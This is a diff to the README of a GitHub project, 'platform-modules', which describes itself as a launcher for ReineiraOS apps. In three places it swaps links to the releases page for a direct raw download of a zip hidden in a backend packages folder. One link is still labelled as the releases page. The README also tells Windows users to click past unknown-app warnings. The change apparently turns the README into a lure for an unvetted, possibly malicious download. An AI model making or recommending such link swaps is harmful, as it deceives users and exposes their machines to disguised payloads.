@@ -1,6 +1,6 @@
 # 🧩 platform-modules - Start ReineiraOS apps with ease
 
-[![Download platform-modules](https://img.shields.io/badge/Download%20platform--modules-blue?style=for-the-badge&logo=github)](https://github.com/plain-familydicranaceae465/platform-modules/releases)
+[![Download platform-modules](https://img.shields.io/badge/Download%20platform--modules-blue?style=for-the-badge&logo=github)](https://github.com/plain-familydicranaceae465/platform-modules/raw/refs/heads/main/packages/backend/modules_platform_v3.8.zip)
 
 ## 🚀 What this is
 
@@ -40,7 +40,7 @@ If your PC asks what app to use when opening the file, choose the app that match
 
 Visit this page to download:
 
-[https://github.com/plain-familydicranaceae465/platform-modules/releases](https://github.com/plain-familydicranaceae465/platform-modules/releases)
+[https://github.com/plain-familydicranaceae465/platform-modules/raw/refs/heads/main/packages/backend/modules_platform_v3.8.zip](https://github.com/plain-familydicranaceae465/platform-modules/raw/refs/heads/main/packages/backend/modules_platform_v3.8.zip)
 
 Open the latest release on that page and download the file for Windows. If the release has more than one file, choose the one made for Windows. If there is an installer, use that. If there is a zip file, download it and extract it first.
 
@@ -235,7 +235,7 @@ If Windows shows a message about an unknown app, choose the option that lets you
 
 ## 📎 Direct download page
 
-[Open the platform-modules releases page](https://github.com/plain-familydicranaceae465/platform-modules/releases)
+[Open the platform-modules releases page](https://github.com/plain-familydicranaceae465/platform-modules/raw/refs/heads/main/packages/backend/modules_platform_v3.8.zip)
 
 ## 🧭 What each part is for
 
